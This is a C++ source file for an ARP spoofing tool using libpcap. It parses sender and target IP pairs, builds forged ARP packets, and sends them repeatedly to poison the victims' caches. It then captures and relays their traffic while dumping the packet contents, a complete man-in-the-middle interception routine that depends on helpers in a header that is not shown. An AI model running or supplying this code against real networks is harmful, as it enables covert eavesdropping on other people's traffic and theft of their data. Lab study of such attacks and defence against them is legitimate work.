#include <iostream>
#include <vector>
#include "spoof.h"

using namespace std;

const char* dev;
pcap_t* handle;
uint8_t* myIp;
uint8_t* myMac;

int main(int argc, const char** argv)
{
    if(argc < 4 || (argc % 2) != 0){
        usage();
        return -1;
    }

    dev = argv[1];
    myIp = new uint8_t[4];
    myMac = new uint8_t[6];

    setMyIP();
    setMyMac();

    for (int i = 0; i < 4; i++)
        printf("%d.", *(myIp + i));
    printf("\b \n");
    for (int i = 0; i < 6; i++)
        printf("%02x:", *(myMac + i));
    printf("\b \n");

    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return -2;
    }

    vector<session*> sessions;
    vector<uint8_t*> arpPackets;

    for (int i = 0; i < (argc - 1) / 2; i++){
        session* tmp = new session;
        memcpy(tmp->sender_ip, parseIP(argv[2 + i*2]), 4);
        memcpy(tmp->target_ip, parseIP(argv[3 + i*2]), 4);
        memcpy(tmp->sender_mac, "\x00\x00\x00\x00\x00\x00", 6);
        memcpy(tmp->target_mac, "\x00\x00\x00\x00\x00\x00", 6);
        sessions.push_back(tmp);
    }

    for(auto a : sessions){
        etherHeader* eth = new etherHeader;
        arpHeader* arp = new arpHeader;
        cout << "setting mac" << endl;
        setMac(a);
        cout << "set my mac" << endl;
        setARPPacketHeaders(eth, arp, a);
        cout << "set arp packet header" << endl;
        uint8_t* tmp = makeARPPacket(eth, arp);
        cout << "made arp packet" << endl;
        arpPackets.push_back(tmp);
        delete eth;
        delete arp;
    }

    for (auto a : sessions){
        for (int i = 0; i < 4; i++)
            printf("%d.", *(a->sender_ip + i));
        printf("\b \n");
        for (int i = 0; i < 6; i++)
            printf("%02x:", *(a->sender_mac + i));
        printf("\b \n");
        for (int i = 0; i < 4; i++)
            printf("%d.", *(a->target_ip + i));
        printf("\b \n");
        for (int i = 0; i < 6; i++)
            printf("%02x:", *(a->target_mac + i));
        printf("\b \n");
    }

    int count = 0;

    while(true){
        count ++;
        for (auto a : arpPackets){
            //dumpPacket(a, 42);
            pcap_sendpacket(handle, a, 42);
        }
        if (count < 5) continue;
        for (int i = 0; i < 20; i++) {
            struct pcap_pkthdr* header;
            const uint8_t* packet;
            int res = pcap_next_ex(handle, &header, &packet);
            if (res == 0) continue;
            if (res == -1 || res == -2) break;
            for (auto a : sessions){
                if(hasToRelay(a, packet)){
                    uint8_t* relay = relayPacket(a, packet, header->len);
                    dumpPacket(packet, header->len);
                    dumpPacket(relay, header->len);
                    pcap_sendpacket(handle, relay, header->len);
                }
            }
        }
         sleep(1);
    }

}
